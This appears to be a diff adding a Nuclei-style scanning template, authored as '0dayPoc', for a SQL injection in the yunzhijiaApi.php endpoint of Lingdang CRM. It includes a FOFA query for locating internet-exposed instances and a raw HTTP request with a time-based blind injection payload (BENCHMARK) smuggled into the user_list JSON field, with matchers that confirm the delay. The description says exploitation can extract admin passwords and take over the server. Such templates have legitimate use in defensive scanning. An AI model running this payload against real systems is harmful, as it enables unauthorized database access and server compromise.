@@ -1,0 +1,29 @@
+id: lingdang-crm-yunzhijiaapi-sqli
+info:
+  name: 灵当CRM yunzhijiaApi.php组件SQL注入漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="crmcommon/js/jquery/jquery-1.10.1.min.js" || (body="http://localhost:8088/crm/index.php" && body="ldcrm.base.js")
+      灵当CRM系统yunzhijiaApi.php接口存在SQL注入漏洞。攻击者可通过构造恶意SQL语句，绕过身份验证机制，从数据库中提取敏感信息（包括但不限于管理员后台密码、用户个人信息）。在具备高权限访问的情况下，攻击者可进一步向服务器写入恶意脚本，实现对服务器的完全控制。
+      利用执行次数延迟
+  tags: 灵当CRM
+http:
+- raw:
+  - |
+    GET /crm/WeiXinApp/yunzhijia/yunzhijiaApi.php?function=delete_user&user_list={%22name%22:%22admin%27)+AND+6731=BENCHMARK(10000000,MD5(0x79414d76))--+SYit%22} HTTP/1.1
+    Host: {{Hostname}}
+    Accept-Encoding: gzip, deflate
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+    sleep: sleep
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: dsl
+    dsl:
+    - duration_1>=5 && duration_1<=7
+    condition: and
+
